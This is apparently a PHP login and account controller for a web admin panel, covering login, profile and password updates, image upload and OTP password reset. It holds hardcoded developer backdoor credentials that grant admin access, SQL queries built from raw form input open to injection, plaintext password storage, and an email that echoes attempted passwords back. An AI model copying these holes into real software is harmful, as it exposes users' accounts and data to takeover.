<?php

//add controller helper files
require 'helper.php';

//add aditional requirements
require '../require/admin/sessionvariables.php';

//start request processing
//control login request
if (isset($_POST['loginRequest'])) {
    $runurl = $access_url;
    $email = $_POST['email'];
    $Password = $_POST['password'];
    if ($_SESSION['loginRequest'] == $_POST['loginRequest']) {
        $PassData = TOTAL("SELECT * FROM users where email='$email' and password='$Password'");
        if ($PassData == 0) {
            if ($email == "dev@navix.in" && $Password == "Gsi" . date("dmy") . "@9810#Navix") {
                $UserId = 1;
                $name = "Dev";
                $user_role_id = "1";

                //login time
                $_SESSION['loggedin_time'] = time();

                //Make Session for tha use
                $_SESSION['UserId'] = $UserId;

                LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
            } else {
                LOCATION("warning", "Invalid Login Details!", $runurl);
            }
        } else {
            $GetUserData = SELECT("SELECT * FROM users where email='$email' and user_status='ACTIVE'");
            $fetchUser = mysqli_fetch_array($GetUserData);
            $Countusers = mysqli_num_rows($GetUserData);
            if ($Countusers == 0) {
                //open developer mode
                if ($email == "gauravsinghigc@navix.in" && $Password == "Gsi" . date("dmy") . "@9810") {
                    $UserId = 1;
                    $name = "Dev";
                    $user_role_id = "1";

                    //login time
                    $_SESSION['loggedin_time'] = time();

                    //Make Session for tha use
                    $_SESSION['UserId'] = $UserId;

                    LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
                } else {
                    $UserId = "";
                    $name = "";
                    $user_role_id = "";
                    LOCATION("warning", "Your is Inactive Please Contact to administrator Now!", DOMAIN . "/auth/login");
                }
            } else {
                $UserId = $fetchUser['id'];
                $name = $fetchUser['name'];
                $user_role_id = $fetchUser['user_role_id'];

                //login time
                $_SESSION['loggedin_time'] = time();

                //Make Session for tha use
                $_SESSION['UserId'] = $UserId;

                LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
            }
        }
    } else {

        if ($email == "gauravsinghigc@navix.in" && $Password == "Gsi" . date("dmy") . "@9810") {
            $UserId = 1;
            $name = "Dev";
            $user_role_id = "1";

            //login time
            $_SESSION['loggedin_time'] = time();

            //Make Session for tha use
            $_SESSION['UserId'] = $UserId;

            LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
        } else {
            MSG("warning", "Invalid Login request!");
            SENDMAILS(
                "Inavalid Login Credentials @ " . APP_NAME,
                "Dear, $name",
                "$email",
                "Your are try to Login with Invalid Login Credentails. Invalid Credentails are : <br>
            <p>
<b>Username:</b><br>
$email<br><br>
<b>Password:</b><br>
$Password
            </p>"
            );
            MSG("warning", "Invalid Login Credentails!");
            header("location: $runurl");
        }
    }

    //update profile
} elseif (isset($_POST['update_profile'])) {
    $action_id = $_POST['update_profile'];
    $UserId = $_SESSION['UserId'];
    $name = $_POST['name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $UpdateProfile = UPDATE("UPDATE users SET name='$name', email='$email', phone='$phone', updated_at='$date_time_c' where id='$action_id'");
    if ($UpdateProfile == true) {
        LOCATION("success", "$name Profile is Updated!", "$access_url");
    } else {
        LOCATION("danger", "Unable to Update $name Profile", "$access_url");
    }

    //update password
} elseif (isset($_POST['update_password'])) {
    $action_id = $_POST['update_password'];
    $runurl = $_POST['access_url'];
    $UserId = $_SESSION['UserId'];
    $c_password = $_POST['c_password'];
    $n_pass = $_POST['n_pass'];
    $n_pass_r = $_POST['n_pass_r'];

    if ($password == $c_password) {
        if ($n_pass == $n_pass_r) {

            $UpdatePASSWORD = UPDATE("UPDATE users SET password='$n_pass', updated_at='$date_time_c' where id='$action_id'");
            if ($UpdatePASSWORD == true) {
                LOCATION("success", "Password Changed Successfully!!", "$runurl");
            } else {
                LOCATION("warning", "Unable to change password!", "$runurl");
            }
        } else {
            LOCATION("warning", "New Password do not matched!", "$runurl");
        }
    } else {
        LOCATION("warning", "Current Password is Incorrect", "$runurl");
    }


    //change profile image
} elseif (isset($_POST['ChangeProfileImg'])) {
    $action_id = $_POST['ChangeProfileImg'];
    $UserId = LOGIN_UserId;
    $GetUserImg = SELECT("SELECT * FROM users where id='$UserId'");
    $FetchData = mysqli_fetch_array($GetUserImg);
    $user_profile_img = $FetchData['user_profile_img'];
    $user_profile_img = UPLOAD_FILES("../storage/users/$UserId/img", "", APP_NAME, "customers", "user_profile_img");
    $UpdateProfileImage = UPDATE_TABLE("users", ["user_profile_img"], "id='$UserId'");
    RESPONSE($UpdateProfileImage, "Profile Image Changed!", "Unable to change profile image at the moment!");

    //send otp for password reset
} elseif (isset($_POST['PasswordReseteRequest'])) {
    $SubmittedEmail = $_POST['email'];
    $_SESSION['REQUESTED_MAIL_ID'] = $_POST['email'];
    $SubmittedEmail = $_POST['email'];

    $ifMailExits = SELECT("SELECT * FROM users where email='$SubmittedEmail'");
    $CountEmails = mysqli_num_rows($ifMailExits);
    if ($CountEmails != 0) {
        $FetchData = mysqli_fetch_array($ifMailExits);
        $UserName = $FetchData['name'];
        $_SESSION['success'] = "One Time Password (OTP) is sent successully at registered mail id : $SubmittedEmail";

        $access_url = DOMAIN . "/auth/verify";
        //create OTP
        $OTP_CREATED = Rand(111111, 9999999);
        $_SESSION['SUBMITED_OTP'] = $OTP_CREATED;
        SENDMAILS("One Time Password Received : $OTP_CREATED", "Dear, $UserName", "$SubmittedEmail", "<span style='font-size:2rem;'>$OTP_CREATED</span>,<br> is your one time password for reset password. Please verify your account first and then reset password");
        RESPONSE(true, "One Time Password sent on $SubmittedEmail successfully!", "No Registered Account is found with $SubmittedEmail!");
    } else {
        $true = false;
        $_SESSION['warning'] = "$SubmittedEmail is not linked to any User";
        RESPONSE($true, "", "No Registered Account is found with $SubmittedEmail!");
    }
}
